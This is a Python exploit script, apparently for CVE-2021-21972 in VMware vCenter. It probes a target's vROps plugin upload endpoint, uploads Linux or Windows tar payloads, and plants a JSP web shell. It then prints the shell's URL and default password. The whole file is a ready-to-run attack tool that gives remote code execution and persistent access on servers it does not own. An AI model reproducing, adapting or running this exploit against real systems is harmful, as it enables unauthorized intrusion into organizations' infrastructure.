'''
Author         : Sp4ce
Date           : 2021-02-24 18:17:06
LastEditors    : Sp4ce
LastEditTime   : 2021-02-25 00:17:36
Description    : Challenge Everything.
'''
import requests
import os
import argparse
import urllib3

# remove SSL warning
urllib3.disable_warnings()

# get script work path
WORK_PATH = os.getcwd()
# init payload path
LINUX_PAYLOAD = WORK_PATH + '/payload/Linux.tar'
WINDOWS_PAYLOAD = WORK_PATH + '/payload/Windows.tar'
# init vulnerable url and shell URL
VUL_URI = '/ui/vropspluginui/rest/services/uploadova'
SHELL_URL = '/ui/resources/shell.jsp'

# set connect timeout
TIMEOUT=10
# set headers
headers={}
headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'


def checkVul(URL):
    try:
        res = requests.get(URL+VUL_URI, verify=False,timeout=TIMEOUT,headers=headers)
        print('[*] Check {URL} is vul ...'.format(URL=URL))
        if res.status_code == 405:
            print('[!] {URL} IS vul ...'.format(URL=URL))
            return True
        else:
            print('[-] {URL} is NOT vul ...'.format(URL=URL))
            return False
    except:
        print('[-] {URL} connect failed ...'.format(URL=URL))
        return False



def checkShellExist(URL):
    res = requests.get(URL + SHELL_URL, verify=False,timeout=TIMEOUT,headers=headers)
    if res.status_code != 404:
        return True
    else:
        return False

def uploadWindowsPayload(URL):
    print(
            '[-] Shell upload success, BUT NOT EXIST, trying windows payload...'
        )
    file = {'uploadFile': open(WINDOWS_PAYLOAD, 'rb')}
    re = requests.post(URL + VUL_URI, files=file, verify=False,timeout=TIMEOUT,headers=headers)
    if 'SUCCESS' in re.text:
        if checkShellExist(URL):
            print('[+] Shell exist URL: {url}, default password:rebeyond'.format(url=URL + SHELL_URL))
        else:
            print(
                '[-] All payload has been upload but not success.'
            )

def getshell(URL):
    print('[*] Trying linux payload...')
    file = {'uploadFile': open(LINUX_PAYLOAD, 'rb')}
    re = requests.post(URL + VUL_URI, files=file, verify=False,timeout=TIMEOUT,headers=headers)
    if 'SUCCESS' in re.text:
        print('[+] Shell upload success, now check is shell exist...')
        if checkShellExist(URL):
            print(
                '[+] Shell exist URL: {url}, default password:rebeyond'.format(
                    url=URL + SHELL_URL))
        else:
            uploadWindowsPayload(URL)
    else:
        uploadWindowsPayload(URL)


def banner():
    print("""
   _______      ________    ___   ___ ___  __      ___  __  ___ ______ ___  
  / ____\\ \\    / /  ____|  |__ \\ / _ \\__ \\/_ |    |__ \\/_ |/ _ \\____  |__ \\ 
 | |     \\ \\  / /| |__ ______ ) | | | | ) || |______ ) || | (_) |  / /   ) |
 | |      \\ \\/ / |  __|______/ /| | | |/ / | |______/ / | |\\__, | / /   / / 
 | |____   \\  /  | |____    / /_| |_| / /_ | |     / /_ | |  / / / /   / /_ 
  \\_____|   \\/   |______|  |____|\\___/____||_|    |____||_| /_/ /_/   |____|
                Test On vCenter 6.5 Linux/Windows
                        By: Sp4ce                                                    
                        Github:https://github.com/NS-Sp4ce                                                    
    """)

if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-url",
        "--targeturl",
        type=str,
        help="Target URL. e.g: -url 192.168.2.1„ÄÅ-url https://192.168.2.1")
    args = parser.parse_args()
    url = args.targeturl
    if 'https://' not in url:
        url = 'https://' + url
        if checkVul(url):
            getshell(url)
    elif checkVul(url):
        getshell(url)
    else:
        parser.print_help()
